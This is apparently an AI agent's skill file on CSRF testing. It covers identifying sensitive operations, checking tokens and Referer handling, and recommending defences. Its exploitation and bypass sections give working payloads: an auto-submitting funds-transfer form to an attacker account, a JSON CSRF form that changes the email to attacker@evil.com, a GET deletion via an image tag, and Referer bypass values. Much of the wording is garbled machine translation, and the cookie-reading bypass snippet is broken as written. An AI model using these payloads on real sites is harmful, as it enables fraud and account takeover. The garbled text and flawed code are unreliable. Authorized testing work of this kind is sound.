---
name: csrf-testing
Professional skills and methodology for CSRF (cross-site request forgery) testing
version: 1.0.0
---

# CSRF (Cross-Site Request Forgery) Testing

## Overview

This skill provides detection, use, and protection against CSRF vulnerabilities.

## Vulnerability Principle

- Attacker induces users to access malicious pages
- Malicious page automatically sends request to target site
- Browser automatically carries user authentication information (Cookie, session)
- The target site was mistaken for the user to operate legally.

## Test Method

### 1. Identification of sensitive operations

- Password Changes
- Email address change
- Transfer Operations
- Permission Change
- Data Deleting
- State Update

### 2. Detecting the CSRF Token

**Check for Token protection:**
```html
<!-- Yes.TokenProtection -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="password" name="new_password">
</form>

<!-- NoneTokenProtection - ExistenceCSRFRisk -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. Validation of Token

**Test of Token's predictability:**
- TokenWhether or not to use a time stamp
- TokenWhether or not to be user-basedID
- TokenReusable
- TokenWhether to share with multiple requests

### 4. Inspection of Referer verification

**Test Referer to check if it can be bypassed:**
```javascript
// Normal request
Referer: https://target.com/change-password

// Test bypass
Referer: https://target.com.evil.com
Referer: https://evil.com/?target.com
Referer: (Empty)
```

## Exploitation Techniques

### Base CSRF attack

**HTML forms automatically submitted:**
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF

**Around Content-Type:**
```html
<!-- UsingformSubmission of formsJSON -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### GETRequestCSRF

**Using GET to request attack:**
```html
<img src="https://target.com/api/delete?id=123">
```

## Bypass Techniques

### TokenBypass

**If Token in Cookie:**
```javascript
// If...TokenAt the same time.CookieAnd in the form.
// You can try to submit onlyCookieMediumToken
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: 'action=delete&id=123'
  // No csrf_token parameter; relies on the cookie
});
```

### SameSite CookieBypass

**Using subdomain name:**
- If SameSite=Lax, the GET request can still carry Cookie
- Use sub-domain names to attack.

### Double submissionCookie

**About Token verification:**
```html
<!-- If the token is in a cookie and validation is flawed -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <script>
    // FromCookieReadingToken
    document.cookie.split(';').forEach(c => {
      if(c.trim().startsWith('csrf_token=')) {
        document.querySelector('input[name="csrf_token"]').value = 
          c.split('=')[1];
      }
    });
  </script>
</form>
```

## Using the Tools

### Burp Suite

**Using CSRF PoC generator:**
1. Interception of target requests
2. Right â†’ Engagement tools â†’ Generate CSRF PoC
3. Test generatedPoC

### OWASP ZAP

```bash
# UsingZAPConductCSRFScan
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
```

## Verification and Reporting

### Verification Steps

1. Confirm target operation without CSRF Token protection
2. Construct malware request and verify executable
3. Assess the impact (data disclosure, enhanced authority, financial loss, etc.)
4. Record the completePOC
5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration

### Reporting Checklist

- Leak position and affected operations
- The scene of the attack and the range of its impact
- the complete exploitation steps andPoC
- Remediation recommendations (CSRF Token, SameSite Cookie, Referer validation, etc.)

## Preventive Measures

### Recommended Approach

1. **CSRF Token**
   - Each form contains the onlyToken
   - Token is stored in Sesion.
   - Validate Token

2. **SameSite Cookie**
   ```javascript
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

3. **Double submissionCookie**
   - Token is present in Cookie and form.
   - Verify if the two match

4. **RefererVerification**
   - Verify whether Referer is the same source
   - Keep an eye out for Refer's handling.

## Important Notes

- Perform only in an authorized testing environment
- Avoid physical impact on user accounts
- Record all test steps
- Consider differences in behaviour of different browsers
